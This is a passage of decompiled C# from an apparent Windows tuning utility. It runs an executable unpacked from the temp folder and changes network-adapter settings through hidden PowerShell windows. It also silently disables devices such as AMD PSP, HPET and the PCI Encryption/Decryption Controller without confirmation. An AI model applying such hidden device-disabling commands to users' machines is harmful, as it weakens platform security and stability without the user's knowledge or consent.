		// Token: 0x06000025 RID: 37 RVA: 0x00006F84 File Offset: 0x00005184
		[DebuggerStepThrough]
		private void gpuSettings()
		{
			Products.<gpuSettings>d__14 <gpuSettings>d__ = new Products.<gpuSettings>d__14();
			<gpuSettings>d__.<>t__builder = AsyncVoidMethodBuilder.Create();
			<gpuSettings>d__.<>4__this = this;
			<gpuSettings>d__.<>1__state = -1;
			<gpuSettings>d__.<>t__builder.Start<Products.<gpuSettings>d__14>(ref <gpuSettings>d__);
		}

		// Token: 0x06000026 RID: 38 RVA: 0x00006FC0 File Offset: 0x000051C0
		[DebuggerStepThrough]
		private void startOther()
		{
			Products.<startOther>d__16 <startOther>d__ = new Products.<startOther>d__16();
			<startOther>d__.<>t__builder = AsyncVoidMethodBuilder.Create();
			<startOther>d__.<>4__this = this;
			<startOther>d__.<>1__state = -1;
			<startOther>d__.<>t__builder.Start<Products.<startOther>d__16>(ref <startOther>d__);
		}

		// Token: 0x06000027 RID: 39 RVA: 0x00006FFC File Offset: 0x000051FC
		private void Other()
		{
			Thread.Sleep(2000);
			ZipFile.ExtractToDirectory(Path.GetTempPath() + "\\SDIO.zip", Path.GetTempPath() ?? "");
			Process sdio = new Process();
			sdio.StartInfo.FileName = Path.GetTempPath() + "SDIO_x64_R762.exe";
			sdio.Start();
			sdio.WaitForExit();
			Process process = new Process();
			process.StartInfo.FileName = "powershell.exe";
			process.StartInfo.Arguments = "Get-NetAdapter -Physical | where status -eq 'up' > \"" + Path.GetTempPath() + "\\Network.txt\"";
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.StartInfo.CreateNoWindow = true;
			process.Start();
			process.WaitForExit();
			string str = File.ReadAllText(Path.GetTempPath() + "Network.txt");
			bool flag = str.Contains("Realtek");
			if (flag)
			{
				new Process
				{
					StartInfo = 
					{
						FileName = "powershell.exe",
						Arguments = "Set-NetAdapterAdvancedProperty -Name Ethernet -DisplayName 'Green Ethernet' -DisplayValue 'Disabled'",
						WindowStyle = ProcessWindowStyle.Hidden,
						CreateNoWindow = true
					}
				}.Start();
				Process process2 = new Process();
				process2.StartInfo.FileName = "powershell.exe";
				process2.StartInfo.Arguments = "Set-NetAdapterAdvancedProperty -Name Ethernet -DisplayName 'Gigabit Lite' -DisplayValue 'Disabled'";
				process2.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process2.StartInfo.CreateNoWindow = true;
				process2.Start();
				process2.WaitForExit();
				Process process3 = new Process();
				process3.StartInfo.FileName = "powershell.exe";
				process3.StartInfo.Arguments = "Set-NetAdapterAdvancedProperty -Name Ethernet -DisplayName 'Power Saving Mode' -DisplayValue 'Disabled'";
				process3.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process3.StartInfo.CreateNoWindow = true;
				process3.Start();
				process3.WaitForExit();
				Process process4 = new Process();
				process4.StartInfo.FileName = "powershell.exe";
				process4.StartInfo.Arguments = "Set-NetAdapterAdvancedProperty -Name Ethernet -DisplayName 'Energy-Efficient Ethernet' -DisplayValue 'Disabled'";
				process4.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process4.StartInfo.CreateNoWindow = true;
				process4.Start();
				process4.WaitForExit();
				Process process5 = new Process();
				process5.StartInfo.FileName = "powershell.exe";
				process5.StartInfo.Arguments = "Set-NetAdapterAdvancedProperty -Name Ethernet -DisplayName 'Wake on Magic Packet' -DisplayValue 'Disabled'";
				process5.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process5.StartInfo.CreateNoWindow = true;
				process5.Start();
				process5.WaitForExit();
				Process process6 = new Process();
				process6.StartInfo.FileName = "powershell.exe";
				process6.StartInfo.Arguments = "Set-NetAdapterAdvancedProperty -Name Ethernet -DisplayName 'Wake on pattern match' -DisplayValue 'Disabled'";
				process6.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process6.StartInfo.CreateNoWindow = true;
				process6.Start();
				process6.WaitForExit();
				Process process7 = new Process();
				process7.StartInfo.FileName = "powershell.exe";
				process7.StartInfo.Arguments = "Set-NetAdapterAdvancedProperty -Name Ethernet -DisplayName 'WOL & Shutdown Link Speed' -DisplayValue 'Not Speed Down'";
				process7.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process7.StartInfo.CreateNoWindow = true;
				process7.Start();
				process7.WaitForExit();
				Process process8 = new Process();
				process8.StartInfo.FileName = "powershell.exe";
				process8.StartInfo.Arguments = "Set-NetAdapterAdvancedProperty -Name Ethernet -DisplayName 'Shutdown Wake-On-Lan' -DisplayValue 'Disabled'";
				process8.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process8.StartInfo.CreateNoWindow = true;
				process8.Start();
				process8.WaitForExit();
				Process process9 = new Process();
				process9.StartInfo.FileName = "powershell.exe";
				process9.StartInfo.Arguments = "Set-NetAdapterAdvancedProperty -Name Ethernet -DisplayName 'Jumbo Frame' -DisplayValue 'Disabled'";
				process9.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process9.StartInfo.CreateNoWindow = true;
				process9.Start();
				process9.WaitForExit();
				Process process10 = new Process();
				process10.StartInfo.FileName = "powershell.exe";
				process10.StartInfo.Arguments = "Set-NetAdapterAdvancedProperty -Name Ethernet -DisplayName 'Auto Disable Gigabit' -DisplayValue 'Disabled'";
				process10.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process10.StartInfo.CreateNoWindow = true;
				process10.Start();
				process10.WaitForExit();
				Process process11 = new Process();
				process11.StartInfo.FileName = "powershell.exe";
				process11.StartInfo.Arguments = "Set-NetAdapterAdvancedProperty -Name Ethernet -DisplayName 'Flow Control' -DisplayValue 'Disabled'";
				process11.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process11.StartInfo.CreateNoWindow = true;
				process11.Start();
				process11.WaitForExit();
				Process process12 = new Process();
				process12.StartInfo.FileName = "powershell.exe";
				process12.StartInfo.Arguments = "Set-NetAdapterAdvancedProperty -Name Ethernet -DisplayName 'Large Send Offload v2 (IPv4)' -DisplayValue 'Disabled'";
				process12.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process12.StartInfo.CreateNoWindow = true;
				process12.Start();
				process12.WaitForExit();
				Process process13 = new Process();
				process13.StartInfo.FileName = "powershell.exe";
				process13.StartInfo.Arguments = "Set-NetAdapterAdvancedProperty -Name Ethernet -DisplayName 'Large Send Offload v2 (IPv6)' -DisplayValue 'Disabled'";
				process13.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process13.StartInfo.CreateNoWindow = true;
				process13.Start();
				process13.WaitForExit();
				Process process14 = new Process();
				process14.StartInfo.FileName = "powershell.exe";
				process14.StartInfo.Arguments = "Set-NetAdapterAdvancedProperty -Name Ethernet -DisplayName 'Receive Side Scaling' -DisplayValue 'Enabled'";
				process14.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process14.StartInfo.CreateNoWindow = true;
				process14.Start();
				process14.WaitForExit();
				Process process15 = new Process();
				process15.StartInfo.FileName = "powershell.exe";
				process15.StartInfo.Arguments = "Set-NetAdapterAdvancedProperty -Name Ethernet -DisplayName 'TCP Checksum Offload (IPv4)' -DisplayValue 'Rx & Tx Enabled'";
				process15.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process15.StartInfo.CreateNoWindow = true;
				process15.Start();
				process15.WaitForExit();
				Process process16 = new Process();
				process16.StartInfo.FileName = "powershell.exe";
				process16.StartInfo.Arguments = "Set-NetAdapterAdvancedProperty -Name Ethernet -DisplayName 'TCP Checksum Offload (IPv6)' -DisplayValue 'Rx & Tx Enabled'";
				process16.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process16.StartInfo.CreateNoWindow = true;
				process16.Start();
				process16.WaitForExit();
				Process process17 = new Process();
				process17.StartInfo.FileName = "powershell.exe";
				process17.StartInfo.Arguments = "Set-NetAdapterAdvancedProperty -Name Ethernet -DisplayName 'UDP Checksum Offload (IPv4)' -DisplayValue 'Rx & Tx Enabled'";
				process17.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process17.StartInfo.CreateNoWindow = true;
				process17.Start();
				process17.WaitForExit();
				Process process18 = new Process();
				process18.StartInfo.FileName = "powershell.exe";
				process18.StartInfo.Arguments = "Set-NetAdapterAdvancedProperty -Name Ethernet -DisplayName 'UDP Checksum Offload (IPv6)' -DisplayValue 'Rx & Tx Enabled'";
				process18.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process18.StartInfo.CreateNoWindow = true;
				process18.Start();
				process18.WaitForExit();
				Process process19 = new Process();
				process19.StartInfo.FileName = "powershell.exe";
				process19.StartInfo.Arguments = "Set-NetAdapterAdvancedProperty -Name Ethernet -DisplayName 'ARP Offload' -DisplayValue 'Disabled'";
				process19.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process19.StartInfo.CreateNoWindow = true;
				process19.Start();
				process19.WaitForExit();
				Process process20 = new Process();
				process20.StartInfo.FileName = "powershell.exe";
				process20.StartInfo.Arguments = "Set-NetAdapterAdvancedProperty -Name Ethernet -DisplayName 'NS Offload' -DisplayValue 'Disabled'";
				process20.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process20.StartInfo.CreateNoWindow = true;
				process20.Start();
				process20.WaitForExit();
				Process process21 = new Process();
				process21.StartInfo.FileName = "powershell.exe";
				process21.StartInfo.Arguments = "Set-NetAdapterAdvancedProperty -Name Ethernet -DisplayName 'Advanced EEE' -DisplayValue 'Disabled'";
				process21.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process21.StartInfo.CreateNoWindow = true;
				process21.Start();
				process21.WaitForExit();
			}
			else
			{
				bool flag2 = str.Contains("Killer");
				if (flag2)
				{
					new Process
					{
						StartInfo = 
						{
							FileName = "powershell.exe",
							Arguments = "Set-NetAdapterAdvancedProperty -Name Ethernet -DisplayName 'Green Ethernet' -DisplayValue 'Disabled'",
							WindowStyle = ProcessWindowStyle.Hidden,
							CreateNoWindow = true
						}
					}.Start();
					new Process
					{
						StartInfo = 
						{
							FileName = "powershell.exe",
							Arguments = "Set-NetAdapterAdvancedProperty -Name Ethernet -DisplayName 'Maximum Number of RSS Queues' -DisplayValue '4 Queues'",
							WindowStyle = ProcessWindowStyle.Hidden,
							CreateNoWindow = true
						}
					}.Start();
					new Process
					{
						StartInfo = 
						{
							FileName = "powershell.exe",
							Arguments = "Set-NetAdapterAdvancedProperty -Name Ethernet -DisplayName 'Priority & VLAN' -DisplayValue 'Priority Enabled'",
							WindowStyle = ProcessWindowStyle.Hidden,
							CreateNoWindow = true
						}
					}.Start();
					new Process
					{
						StartInfo = 
						{
							FileName = "powershell.exe",
							Arguments = "Set-NetAdapterAdvancedProperty -Name Ethernet -DisplayName 'Interrupt Moderation' -DisplayValue 'Disabled'",
							WindowStyle = ProcessWindowStyle.Hidden,
							CreateNoWindow = true
						}
					}.Start();
					Process process22 = new Process();
					process22.StartInfo.FileName = "powershell.exe";
					process22.StartInfo.Arguments = "Set-NetAdapterAdvancedProperty -Name Ethernet -DisplayName 'Gigabit Lite' -DisplayValue 'Disabled'";
					process22.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					process22.StartInfo.CreateNoWindow = true;
					process22.Start();
					process22.WaitForExit();
					Process process23 = new Process();
					process23.StartInfo.FileName = "powershell.exe";
					process23.StartInfo.Arguments = "Set-NetAdapterAdvancedProperty -Name Ethernet -DisplayName 'Power Saving Mode' -DisplayValue 'Disabled'";
					process23.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					process23.StartInfo.CreateNoWindow = true;
					process23.Start();
					process23.WaitForExit();
					Process process24 = new Process();
					process24.StartInfo.FileName = "powershell.exe";
					process24.StartInfo.Arguments = "Set-NetAdapterAdvancedProperty -Name Ethernet -DisplayName 'Energy-Efficient Ethernet' -DisplayValue 'Disabled'";
					process24.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					process24.StartInfo.CreateNoWindow = true;
					process24.Start();
					process24.WaitForExit();
					Process process25 = new Process();
					process25.StartInfo.FileName = "powershell.exe";
					process25.StartInfo.Arguments = "Set-NetAdapterAdvancedProperty -Name Ethernet -DisplayName 'Wake on Magic Packet' -DisplayValue 'Disabled'";
					process25.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					process25.StartInfo.CreateNoWindow = true;
					process25.Start();
					process25.WaitForExit();
					Process process26 = new Process();
					process26.StartInfo.FileName = "powershell.exe";
					process26.StartInfo.Arguments = "Set-NetAdapterAdvancedProperty -Name Ethernet -DisplayName 'Wake on pattern match' -DisplayValue 'Disabled'";
					process26.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					process26.StartInfo.CreateNoWindow = true;
					process26.Start();
					process26.WaitForExit();
					Process process27 = new Process();
					process27.StartInfo.FileName = "powershell.exe";
					process27.StartInfo.Arguments = "Set-NetAdapterAdvancedProperty -Name Ethernet -DisplayName 'WOL & Shutdown Link Speed' -DisplayValue 'Not Speed Down'";
					process27.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					process27.StartInfo.CreateNoWindow = true;
					process27.Start();
					process27.WaitForExit();
					Process process28 = new Process();
					process28.StartInfo.FileName = "powershell.exe";
					process28.StartInfo.Arguments = "Set-NetAdapterAdvancedProperty -Name Ethernet -DisplayName 'Shutdown Wake-On-Lan' -DisplayValue 'Disabled'";
					process28.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					process28.StartInfo.CreateNoWindow = true;
					process28.Start();
					process28.WaitForExit();
					Process process29 = new Process();
					process29.StartInfo.FileName = "powershell.exe";
					process29.StartInfo.Arguments = "Set-NetAdapterAdvancedProperty -Name Ethernet -DisplayName 'Jumbo Frame' -DisplayValue 'Disabled'";
					process29.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					process29.StartInfo.CreateNoWindow = true;
					process29.Start();
					process29.WaitForExit();
					Process process30 = new Process();
					process30.StartInfo.FileName = "powershell.exe";
					process30.StartInfo.Arguments = "Set-NetAdapterAdvancedProperty -Name Ethernet -DisplayName 'Auto Disable Gigabit' -DisplayValue 'Disabled'";
					process30.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					process30.StartInfo.CreateNoWindow = true;
					process30.Start();
					process30.WaitForExit();
					Process process31 = new Process();
					process31.StartInfo.FileName = "powershell.exe";
					process31.StartInfo.Arguments = "Set-NetAdapterAdvancedProperty -Name Ethernet -DisplayName 'Flow Control' -DisplayValue 'Disabled'";
					process31.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					process31.StartInfo.CreateNoWindow = true;
					process31.Start();
					process31.WaitForExit();
					Process process32 = new Process();
					process32.StartInfo.FileName = "powershell.exe";
					process32.StartInfo.Arguments = "Set-NetAdapterAdvancedProperty -Name Ethernet -DisplayName 'Large Send Offload v2 (IPv4)' -DisplayValue 'Disabled'";
					process32.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					process32.StartInfo.CreateNoWindow = true;
					process32.Start();
					process32.WaitForExit();
					Process process33 = new Process();
					process33.StartInfo.FileName = "powershell.exe";
					process33.StartInfo.Arguments = "Set-NetAdapterAdvancedProperty -Name Ethernet -DisplayName 'Large Send Offload v2 (IPv6)' -DisplayValue 'Disabled'";
					process33.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					process33.StartInfo.CreateNoWindow = true;
					process33.Start();
					process33.WaitForExit();
					Process process34 = new Process();
					process34.StartInfo.FileName = "powershell.exe";
					process34.StartInfo.Arguments = "Set-NetAdapterAdvancedProperty -Name Ethernet -DisplayName 'Receive Side Scaling' -DisplayValue 'Enabled'";
					process34.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					process34.StartInfo.CreateNoWindow = true;
					process34.Start();
					process34.WaitForExit();
					Process process35 = new Process();
					process35.StartInfo.FileName = "powershell.exe";
					process35.StartInfo.Arguments = "Set-NetAdapterAdvancedProperty -Name Ethernet -DisplayName 'TCP Checksum Offload (IPv4)' -DisplayValue 'Rx & Tx Enabled'";
					process35.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					process35.StartInfo.CreateNoWindow = true;
					process35.Start();
					process35.WaitForExit();
					Process process36 = new Process();
					process36.StartInfo.FileName = "powershell.exe";
					process36.StartInfo.Arguments = "Set-NetAdapterAdvancedProperty -Name Ethernet -DisplayName 'TCP Checksum Offload (IPv6)' -DisplayValue 'Rx & Tx Enabled'";
					process36.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					process36.StartInfo.CreateNoWindow = true;
					process36.Start();
					process36.WaitForExit();
					Process process37 = new Process();
					process37.StartInfo.FileName = "powershell.exe";
					process37.StartInfo.Arguments = "Set-NetAdapterAdvancedProperty -Name Ethernet -DisplayName 'UDP Checksum Offload (IPv4)' -DisplayValue 'Disabled'";
					process37.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					process37.StartInfo.CreateNoWindow = true;
					process37.Start();
					process37.WaitForExit();
					Process process38 = new Process();
					process38.StartInfo.FileName = "powershell.exe";
					process38.StartInfo.Arguments = "Set-NetAdapterAdvancedProperty -Name Ethernet -DisplayName 'UDP Checksum Offload (IPv6)' -DisplayValue 'Disabled'";
					process38.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					process38.StartInfo.CreateNoWindow = true;
					process38.Start();
					process38.WaitForExit();
					Process process39 = new Process();
					process39.StartInfo.FileName = "powershell.exe";
					process39.StartInfo.Arguments = "Set-NetAdapterAdvancedProperty -Name Ethernet -DisplayName 'ARP Offload' -DisplayValue 'Disabled'";
					process39.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					process39.StartInfo.CreateNoWindow = true;
					process39.Start();
					process39.WaitForExit();
					Process process40 = new Process();
					process40.StartInfo.FileName = "powershell.exe";
					process40.StartInfo.Arguments = "Set-NetAdapterAdvancedProperty -Name Ethernet -DisplayName 'Protocol ARP Offload' -DisplayValue 'Disabled'";
					process40.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					process40.StartInfo.CreateNoWindow = true;
					process40.Start();
					process40.WaitForExit();
					Process process41 = new Process();
					process41.StartInfo.FileName = "powershell.exe";
					process41.StartInfo.Arguments = "Set-NetAdapterAdvancedProperty -Name Ethernet -DisplayName 'NS Offload' -DisplayValue 'Disabled'";
					process41.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					process41.StartInfo.CreateNoWindow = true;
					process41.Start();
					process41.WaitForExit();
					Process process42 = new Process();
					process42.StartInfo.FileName = "powershell.exe";
					process42.StartInfo.Arguments = "Set-NetAdapterAdvancedProperty -Name Ethernet -DisplayName 'Protocol NS Offload' -DisplayValue 'Disabled'";
					process42.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					process42.StartInfo.CreateNoWindow = true;
					process42.Start();
					process42.WaitForExit();
					Process process43 = new Process();
					process43.StartInfo.FileName = "powershell.exe";
					process43.StartInfo.Arguments = "Set-NetAdapterAdvancedProperty -Name Ethernet -DisplayName 'Advanced EEE' -DisplayValue 'Disabled'";
					process43.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					process43.StartInfo.CreateNoWindow = true;
					process43.Start();
					process43.WaitForExit();
				}
				else
				{
					bool flag3 = str.Contains("Intel");
					if (flag3)
					{
						Process process44 = new Process();
						process44.StartInfo.FileName = "powershell.exe";
						process44.StartInfo.Arguments = "Set-NetAdapterAdvancedProperty -Name Ethernet -DisplayName 'ARP Offload' -DisplayValue 'Disabled'";
						process44.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
						process44.StartInfo.CreateNoWindow = true;
						process44.Start();
						process44.WaitForExit();
						Process process45 = new Process();
						process45.StartInfo.FileName = "powershell.exe";
						process45.StartInfo.Arguments = "Set-NetAdapterAdvancedProperty -Name Ethernet -DisplayName 'NS Offload' -DisplayValue 'Disabled'";
						process45.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
						process45.StartInfo.CreateNoWindow = true;
						process45.Start();
						process45.WaitForExit();
						Process process46 = new Process();
						process46.StartInfo.FileName = "powershell.exe";
						process46.StartInfo.Arguments = "Set-NetAdapterAdvancedProperty -Name Ethernet -DisplayName 'Ultra Low Power Mode' -DisplayValue 'Disabled'";
						process46.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
						process46.StartInfo.CreateNoWindow = true;
						process46.Start();
						process46.WaitForExit();
						Process process47 = new Process();
						process47.StartInfo.FileName = "powershell.exe";
						process47.StartInfo.Arguments = "Set-NetAdapterAdvancedProperty -Name Ethernet -DisplayName 'Enable PME' -DisplayValue 'Disabled'";
						process47.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
						process47.StartInfo.CreateNoWindow = true;
						process47.Start();
						process47.WaitForExit();
						Process process48 = new Process();
						process48.StartInfo.FileName = "powershell.exe";
						process48.StartInfo.Arguments = "Set-NetAdapterAdvancedProperty -Name Ethernet -DisplayName 'Energy Efficient Ethernet' -DisplayValue 'Off'";
						process48.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
						process48.StartInfo.CreateNoWindow = true;
						process48.Start();
						process48.WaitForExit();
						Process process49 = new Process();
						process49.StartInfo.FileName = "powershell.exe";
						process49.StartInfo.Arguments = "Set-NetAdapterAdvancedProperty -Name Ethernet -DisplayName 'Wait for Link' -DisplayValue 'Off'";
						process49.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
						process49.StartInfo.CreateNoWindow = true;
						process49.Start();
						process49.WaitForExit();
						Process process50 = new Process();
						process50.StartInfo.FileName = "powershell.exe";
						process50.StartInfo.Arguments = "Set-NetAdapterAdvancedProperty -Name Ethernet -DisplayName 'Wake on Link Settings' -DisplayValue 'Disabled'";
						process50.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
						process50.StartInfo.CreateNoWindow = true;
						process50.Start();
						process50.WaitForExit();
						Process process51 = new Process();
						process51.StartInfo.FileName = "powershell.exe";
						process51.StartInfo.Arguments = "Set-NetAdapterAdvancedProperty -Name Ethernet -DisplayName 'Wake on Magic Packet' -DisplayValue 'Disabled'";
						process51.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
						process51.StartInfo.CreateNoWindow = true;
						process51.Start();
						process51.WaitForExit();
						Process process52 = new Process();
						process52.StartInfo.FileName = "powershell.exe";
						process52.StartInfo.Arguments = "Set-NetAdapterAdvancedProperty -Name Ethernet -DisplayName 'Wake on Pattern Match' -DisplayValue 'Disabled'";
						process52.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
						process52.StartInfo.CreateNoWindow = true;
						process52.Start();
						process52.WaitForExit();
						Process process53 = new Process();
						process53.StartInfo.FileName = "powershell.exe";
						process53.StartInfo.Arguments = "Set-NetAdapterAdvancedProperty -Name Ethernet -DisplayName 'System Idle Power Saver' -DisplayValue 'Disabled'";
						process53.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
						process53.StartInfo.CreateNoWindow = true;
						process53.Start();
						process53.WaitForExit();
						Process process54 = new Process();
						process54.StartInfo.FileName = "powershell.exe";
						process54.StartInfo.Arguments = "Set-NetAdapterAdvancedProperty -Name Ethernet -DisplayName 'Jumbo Packet' -DisplayValue 'Disabled'";
						process54.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
						process54.StartInfo.CreateNoWindow = true;
						process54.Start();
						process54.WaitForExit();
						Process process55 = new Process();
						process55.StartInfo.FileName = "powershell.exe";
						process55.StartInfo.Arguments = "Set-NetAdapterAdvancedProperty -Name Ethernet -DisplayName 'Reduce Speed On Power Down' -DisplayValue 'Disabled'";
						process55.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
						process55.StartInfo.CreateNoWindow = true;
						process55.Start();
						process55.WaitForExit();
						Process process56 = new Process();
						process56.StartInfo.FileName = "powershell.exe";
						process56.StartInfo.Arguments = "Set-NetAdapterAdvancedProperty -Name Ethernet -DisplayName 'Large Send Offload v2 (IPv4)' -DisplayValue 'Disabled'";
						process56.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
						process56.StartInfo.CreateNoWindow = true;
						process56.Start();
						process56.WaitForExit();
						Process process57 = new Process();
						process57.StartInfo.FileName = "powershell.exe";
						process57.StartInfo.Arguments = "Set-NetAdapterAdvancedProperty -Name Ethernet -DisplayName 'Large Send Offload v2 (IPv6)' -DisplayValue 'Disabled'";
						process57.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
						process57.StartInfo.CreateNoWindow = true;
						process57.Start();
						process57.WaitForExit();
						Process process58 = new Process();
						process58.StartInfo.FileName = "powershell.exe";
						process58.StartInfo.Arguments = "Set-NetAdapterAdvancedProperty -Name Ethernet -DisplayName 'Flow Control' -DisplayValue 'Disabled'";
						process58.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
						process58.StartInfo.CreateNoWindow = true;
						process58.Start();
						process58.WaitForExit();
					}
				}
			}
			Process process59 = new Process();
			process59.StartInfo.FileName = "powershell.exe";
			process59.StartInfo.Arguments = "Get-PnpDevice -FriendlyName 'AMD PSP' | Disable-PnpDevice -confirm:$false";
			process59.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process59.StartInfo.CreateNoWindow = true;
			process59.Start();
			process59.WaitForExit();
			Process process60 = new Process();
			process60.StartInfo.FileName = "powershell.exe";
			process60.StartInfo.Arguments = "Get-PnpDevice -FriendlyName 'AMD SMBus' | Disable-PnpDevice -confirm:$false";
			process60.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process60.StartInfo.CreateNoWindow = true;
			process60.Start();
			process60.WaitForExit();
			Process process61 = new Process();
			process61.StartInfo.FileName = "powershell.exe";
			process61.StartInfo.Arguments = "Get-PnpDevice -FriendlyName 'Base System Device' | Disable-PnpDevice -confirm:$false";
			process61.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process61.StartInfo.CreateNoWindow = true;
			process61.Start();
			process61.WaitForExit();
			Process process62 = new Process();
			process62.StartInfo.FileName = "powershell.exe";
			process62.StartInfo.Arguments = "Get-PnpDevice -FriendlyName 'Composite Bus Enumerator' | Disable-PnpDevice -confirm:$false";
			process62.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process62.StartInfo.CreateNoWindow = true;
			process62.Start();
			process62.WaitForExit();
			Process process63 = new Process();
			process63.StartInfo.FileName = "powershell.exe";
			process63.StartInfo.Arguments = "Get-PnpDevice -FriendlyName 'High precision event timer' | Disable-PnpDevice -confirm:$false";
			process63.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process63.StartInfo.CreateNoWindow = true;
			process63.Start();
			process63.WaitForExit();
			Process process64 = new Process();
			process64.StartInfo.FileName = "powershell.exe";
			process64.StartInfo.Arguments = "Get-PnpDevice -FriendlyName 'Intel SMBus' | Disable-PnpDevice -confirm:$false";
			process64.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process64.StartInfo.CreateNoWindow = true;
			process64.Start();
			process64.WaitForExit();
			Process process65 = new Process();
			process65.StartInfo.FileName = "powershell.exe";
			process65.StartInfo.Arguments = "Get-PnpDevice -FriendlyName 'Legacy device' | Disable-PnpDevice -confirm:$false";
			process65.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process65.StartInfo.CreateNoWindow = true;
			process65.Start();
			process65.WaitForExit();
			Process process66 = new Process();
			process66.StartInfo.FileName = "powershell.exe";
			process66.StartInfo.Arguments = "Get-PnpDevice -FriendlyName 'Microsoft GS Wavetable Synth' | Disable-PnpDevice -confirm:$false";
			process66.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process66.StartInfo.CreateNoWindow = true;
			process66.Start();
			process66.WaitForExit();
			Process process67 = new Process();
			process67.StartInfo.FileName = "powershell.exe";
			process67.StartInfo.Arguments = "Get-PnpDevice -FriendlyName 'Microsoft Kernel Debug Network Adapter' | Disable-PnpDevice -confirm:$false";
			process67.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process67.StartInfo.CreateNoWindow = true;
			process67.Start();
			process67.WaitForExit();
			Process process68 = new Process();
			process68.StartInfo.FileName = "powershell.exe";
			process68.StartInfo.Arguments = "Get-PnpDevice -FriendlyName 'Microsoft Virtual Drive Enumerator' | Disable-PnpDevice -confirm:$false";
			process68.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process68.StartInfo.CreateNoWindow = true;
			process68.Start();
			process68.WaitForExit();
			Process process69 = new Process();
			process69.StartInfo.FileName = "powershell.exe";
			process69.StartInfo.Arguments = "Get-PnpDevice -FriendlyName 'NDIS Virtual Network Adapter Enumerator' | Disable-PnpDevice -confirm:$false";
			process69.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process69.StartInfo.CreateNoWindow = true;
			process69.Start();
			process69.WaitForExit();
			Process process70 = new Process();
			process70.StartInfo.FileName = "powershell.exe";
			process70.StartInfo.Arguments = "Get-PnpDevice -FriendlyName 'Numeric data processor' | Disable-PnpDevice -confirm:$false";
			process70.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process70.StartInfo.CreateNoWindow = true;
			process70.Start();
			process70.WaitForExit();
			Process process71 = new Process();
			process71.StartInfo.FileName = "powershell.exe";
			process71.StartInfo.Arguments = "Get-PnpDevice -FriendlyName 'PCI Data Acquisition and Signal Processing Controller' | Disable-PnpDevice -confirm:$false";
			process71.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process71.StartInfo.CreateNoWindow = true;
			process71.Start();
			process71.WaitForExit();
			Process process72 = new Process();
			process72.StartInfo.FileName = "powershell.exe";
			process72.StartInfo.Arguments = "Get-PnpDevice -FriendlyName 'PCI Encryption/Decryption Controller' | Disable-PnpDevice -confirm:$false";
			process72.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process72.StartInfo.CreateNoWindow = true;
			process72.Start();
			process72.WaitForExit();
			Process process73 = new Process();
			process73.StartInfo.FileName = "powershell.exe";
